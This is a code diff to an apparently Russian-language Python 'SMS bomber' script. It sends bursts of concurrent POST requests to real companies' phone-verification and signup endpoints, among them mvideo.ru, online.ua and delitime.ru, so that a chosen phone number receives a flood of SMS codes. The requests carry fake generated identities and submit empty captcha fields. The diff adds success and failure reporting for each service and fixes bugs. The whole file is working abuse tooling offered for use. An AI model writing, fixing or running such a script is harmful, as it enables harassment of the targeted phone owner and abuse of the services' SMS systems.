@@ -1,10 +1,32 @@
+from tools.colors import RESET_ALL, FG, BOLD
 import grequests
+from urllib.parse import urlparse
 from information import *
 import json
-from tools.text import *
 from time import sleep
+from tools.text import *
 from random import randint, choice
 from tools.generate_info import GenerateInfo
+
+
+def exception_handler(request, exception):
+    if request.response is None:
+        url = urlparse(request.url)
+        if exception is not None:
+            print(
+                BOLD
+                + FG.lightred
+                + f"{url.netloc.upper()} смс не отправлено!"
+                + RESET_ALL,
+                FG.purple + exception + RESET_ALL,
+            )
+        else:
+            print(
+                BOLD
+                + FG.lightgreen
+                + f"{url.netloc.upper()} смс отправлено!"
+                + RESET_ALL
+            )
 
 
 def send_requests(phone: str, count: int):
@@ -12,11 +34,15 @@ def send_requests(phone: str, count: int):
     username = GenerateInfo().username()
     email = GenerateInfo().email()
     vodafone = (
-        f"+{phone[:2]}("
-        + f"{phone[2:5]}) "
-        + f"{phone[5:8]}-"
-        + f"{phone[8:10]}-"
-        + f"{phone[10:12]}"
+        (
+            f"+{phone[:2]}("
+            + f"{phone[2:5]}) "
+            + f"{phone[5:8]}-"
+            + f"{phone[8:10]}-"
+            + f"{phone[10:12]}"
+        )
+        if len(phone) == 12
+        else ""
     )
     russian_name = GenerateInfo().russian_name()
     iteration = 0
@@ -207,7 +233,11 @@ def send_requests(phone: str, count: int):
             grequests.post(
                 "https://www.mvideo.ru/internal-rest-api/common/atg/rest/actors/VerificationActor/getCode",
                 params={"pageName": "registerPrivateUserPhoneVerificatio"},
-                data={"phone": phone, "recaptcha": "off", "g-recaptcha-response": ""},
+                data={
+                    "phone": phone,
+                    "recaptcha": "off",
+                    "g-recaptcha-response": "",
+                },
                 headers=head,
             ),
             grequests.post(
@@ -240,11 +270,14 @@ def send_requests(phone: str, count: int):
             grequests.post(
                 "https://secure.online.ua/ajax/check_phone/",
                 params={"reg_phone": phone},
-                header=head,
+                headers=head,
             ),
             grequests.post(
                 "https://api.delitime.ru/api/v2/signup",
-                data={"SignupForm[username]": phone, "SignupForm[device_type]": 3},
+                data={
+                    "SignupForm[username]": phone,
+                    "SignupForm[device_type]": 3,
+                },
                 headers=head,
             ),
             grequests.post(
@@ -307,7 +340,9 @@ def send_requests(phone: str, count: int):
                 headers=head,
             ),
         ]
-        grequests.map(requests, gtimeout=3)
+        grequests.map(
+            requests, gtimeout=3, exception_handler=exception_handler
+        )
         iteration += 1
 
         if iteration >= 5 and count >= 10:
